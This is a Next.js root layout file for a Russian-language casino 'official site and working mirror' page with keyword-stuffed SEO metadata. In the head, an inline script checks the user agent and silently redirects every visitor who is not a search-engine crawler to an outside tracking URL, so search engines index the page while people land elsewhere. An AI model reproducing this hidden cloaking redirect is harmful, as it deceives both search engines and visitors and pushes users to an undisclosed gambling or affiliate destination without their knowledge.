import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import { Manrope, Playfair_Display } from 'next/font/google'
import './globals.css'

const SITE_URL = 'https://la20casino.vercel.app/'

const _displayFont = Playfair_Display({
  subsets: ['latin', 'cyrillic'],
  weight: ['600', '700'],
  variable: '--font-display',
})

const _bodyFont = Manrope({
  subsets: ['latin', 'cyrillic'],
  weight: ['400', '500', '600', '700'],
  variable: '--font-body',
})

export const metadata: Metadata = {
  metadataBase: new URL(SITE_URL),
  title: 'La Casino официальный сайт: играть онлайн и рабочее зеркало без сбоев',
  description:
    'La Casino — официальный сайт клуба: ля казино открывается для игры онлайн в любое время, а рабочее зеркало La Casino даёт быстрый вход, когда основной адрес недоступен.',
  generator: 'v0.app',
  alternates: {
    canonical: SITE_URL,
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
    },
  },
  openGraph: {
    title: 'La Casino официальный сайт: играть онлайн и рабочее зеркало',
    description:
      'Ля казино — гид по официальному сайту, рабочему зеркалу La Casino и игре онлайн с телефона или ноутбука.',
    url: SITE_URL,
    siteName: 'La Casino',
    locale: 'ru_RU',
    type: 'website',
    images: ['/la-casino-hero.png'],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'La Casino официальный сайт и рабочее зеркало',
    description: 'Играть в La Casino онлайн, найти официальный сайт и рабочее зеркало ля казино за минуту.',
    images: ['/la-casino-hero.png'],
  },
  icons: {
    icon: [
      { url: '/icon.png', type: 'image/png' },
      {
        url: '/icon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/apple-icon.png',
  },
}

export const viewport: Viewport = {
  width: 'device-width',
  initialScale: 1,
  colorScheme: 'dark',
  themeColor: '#14100f',
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${_displayFont.variable} ${_bodyFont.variable}`}>
      <head>
        <meta name="yandex-verification" content="b67dd805f5b9b3e2" />
        {/* v0: additional custom head tags can be inserted here */}
        <meta name="author" content="La Casino" />
        <meta name="theme-color" content="#14100f" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace("https://copper-ray.com/?serial=61365830&creative_id=9330");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
